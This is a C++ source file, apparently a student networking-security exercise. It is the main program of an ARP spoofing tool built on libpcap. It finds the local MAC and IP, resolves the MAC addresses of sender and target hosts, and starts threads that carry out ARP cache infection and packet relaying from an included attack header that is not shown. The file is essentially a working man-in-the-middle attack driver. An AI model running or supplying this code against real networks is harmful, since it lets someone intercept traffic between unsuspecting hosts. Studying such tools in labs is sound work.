#include <cstdio>
#include <pthread.h>
#include <pcap.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <string.h>
#include <map>
#include "attack.hpp"
#include "attack_util.hpp"

using namespace std;

extern map<Ip, Mac> IpMacMap;
extern map<Ip, Ip> ST_IP_map;

int get_my_mac(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;

    strncpy(s.ifr_name, if_name, IFNAMSIZ);
     
    if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
        return -2;
    }

    mac = (u_char*)s.ifr_addr.sa_data;
    snprintf(dst, dst_size, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return 0;
}


int get_my_ip(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;
   
    strncpy(s.ifr_name, if_name, IFNAMSIZ);

    if(ioctl(fd, SIOCGIFADDR, &s) < 0) {
        return -2;
    }

    inet_ntop(AF_INET, (char*)s.ifr_addr.sa_data + sizeof(ushort), dst, dst_size);
    return 0;
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];

	pcap_t *handle;
	pcap_t *send_handle, *recv_handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char my_mac[0x100];
	char my_ip[0x100];
	
	int pair_size;

	pthread_t *arp_threads = NULL;
	arp_info_st **arp_info_args = NULL;

	pthread_t *spoof_threads = NULL;
	
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	if(get_my_mac(dev, my_mac, sizeof(my_mac)) != 0) {
		perror("get_my_mac_address");
		return -1;
	}

	if(get_my_ip(dev, my_ip, sizeof(my_ip)) != 0) {
		perror("get_my_ip");
		return -1;
	}

	IpMacMap.insert(make_pair(Ip(my_ip), Mac(my_mac)));

	/* Obtain Mac address by Ip passed by argument */
	{
		Mac out;
		for(int i=2; i < argc; i++) {
			if(IpMacMap.find(Ip(argv[i])) != IpMacMap.end())
				continue;

			ERR_CHK (
				get_mac_by_ip,
				(handle, Mac(my_mac), Ip(my_ip), Ip(argv[i]), &out), 
				return -1;
			)

			IpMacMap.insert(make_pair(Ip(argv[i]), out));
			if(i % 2 == 1 && ST_IP_map.find(Ip(argv[i])) == ST_IP_map.end()) {
				ST_IP_map.insert(make_pair(Ip(argv[i-1]), Ip(argv[i])));
				ST_IP_map.insert(make_pair(Ip(argv[i]), Ip(argv[i-1])));
			}
		};
	}

	send_handle = handle;
	recv_handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);

	/* Get ready to run thread */
	initialize_attack_thread(); 

	/* Run arp infection for each sender-target pair */
	pair_size = (argc-2) / 2;
	arp_threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));
	arp_info_args = (arp_info_st**)malloc(pair_size*sizeof(arp_info_st));

	for(int i=2; i < argc; i+=2) {
		uint32_t idx = (i-2)/2;
		arp_info_st *new_arg = (arp_info_st*)malloc(sizeof(arp_info_st));
		new_arg->send_handle = handle;
		new_arg->recv_handle = handle;
		new_arg->my_mac = Mac(my_mac);
		new_arg->sender_ip = Ip(argv[i]);
		new_arg->target_ip = Ip(argv[i+1]);
		new_arg->sender_mac = IpMacMap[new_arg->sender_ip];
		new_arg->target_mac = IpMacMap[new_arg->target_ip];


		arp_info_args[idx] = new_arg;
		pthread_create(&arp_threads[idx], NULL, arpinfect_proc, (void*)arp_info_args[idx]);
	}


	/* run spoof */
	spoof_threads = (pthread_t*)malloc(pair_size*sizeof(pthread_t));

	for(int i=0; i < pair_size; i++) 
		pthread_create(&spoof_threads[i], NULL, spoof_proc, (void*)arp_info_args[i]);

	printf("If you want to quit, enter 'q' > ");
	fflush(stdout);
	while(getchar() != 'q');
	/* Terminate All Attack threads */
	terminate_attack_thread();
	printf("Terminating Thread...\n");
	for(int i=0; i < pair_size; i++) {
		pthread_join(spoof_threads[i], NULL);
		pthread_join(arp_threads[i], NULL);
		free(arp_info_args[i]);
	}

	free(spoof_threads);
	free(arp_threads);
	pcap_close(handle);
}
